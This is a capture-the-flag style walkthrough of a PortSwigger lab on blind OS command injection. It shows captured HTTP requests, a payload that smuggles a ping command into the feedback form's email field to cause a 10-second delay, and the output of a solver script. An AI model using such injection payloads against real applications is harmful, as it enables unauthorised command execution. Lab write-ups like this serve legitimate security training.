# Lab: Blind OS command injection with time delays

### Instructions

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 

### Solution


Capturing a feedback POST request in Burp we see the following request:

```
POST /feedback/submit HTTP/2
Host: 0acb00620402fedf84ff23d800940020.web-security-academy.net
Cookie: session=P6dlLbc8lHGDyyIihghnALWcwlbOOk4i
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Origin: https://0acb00620402fedf84ff23d800940020.web-security-academy.net
Referer: https://0acb00620402fedf84ff23d800940020.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

csrf=jRo4NREdfhg1usqySE7X1hNh4xYw9EzF&name=test&email=test%40test.com&subject=test&message=test
```

We can begin testing these parameters for blind command injection, and find a working payload in the `email` parameter:

```
POST /feedback/submit HTTP/2
Host: 0acb00620402fedf84ff23d800940020.web-security-academy.net
Cookie: session=P6dlLbc8lHGDyyIihghnALWcwlbOOk4i
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Origin: https://0acb00620402fedf84ff23d800940020.web-security-academy.net
Referer: https://0acb00620402fedf84ff23d800940020.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=jRo4NREdfhg1usqySE7X1hNh4xYw9EzF&name=test&email=test%40test.com||+ping+-c+10+127.0.0.1||&subject=test&message=test
```

This causes the application to hang for 10 seconds, which confirms the vulnerability and solves the lab.


### Python Solution

See `cmdi_02.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Command_Injection/CMDi_02_blind_os_command_injection_with_time_delays]
└─$ python cmdi_02.py https://0ae8007c039232828286010c00f500a0.web-security-academy.net/
[*] Trying command injection to make app hang 10 seconds...
[+] Elapsed: 10.36s
[+] Lab solved
```